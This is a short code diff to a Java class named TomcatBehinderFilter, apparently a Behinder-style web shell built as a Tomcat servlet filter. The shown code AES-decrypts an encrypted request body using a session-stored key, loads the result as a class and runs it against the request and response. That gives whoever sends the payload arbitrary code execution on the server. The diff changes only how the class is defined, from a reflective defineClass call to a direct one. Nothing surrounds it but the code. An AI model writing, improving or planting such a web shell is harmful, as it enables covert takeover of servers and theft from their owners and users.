@@ -42,11 +42,7 @@ public class TomcatBehinderFilter extends ClassLoader implements Filter {
             c.init(2, new SecretKeySpec(session.getAttribute("u").toString().getBytes(), "AES"));
             byte[] bytes = c.doFinal(Base64.getDecoder().decode(req.getReader().readLine()));
 
-            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
-            defineClass.setAccessible(true);
-            Class<?> clazz = (Class<?>) defineClass.invoke(new TomcatBehinderFilter(), bytes, 0, bytes.length);
-
-            clazz.newInstance().equals(new Object[]{req, rsp});
+            new TomcatBehinderFilter().defineClass(null, bytes, 0, bytes.length).newInstance().equals(new Object[]{req, rsp});
             return;
         } catch (Exception e) {
             e.printStackTrace();
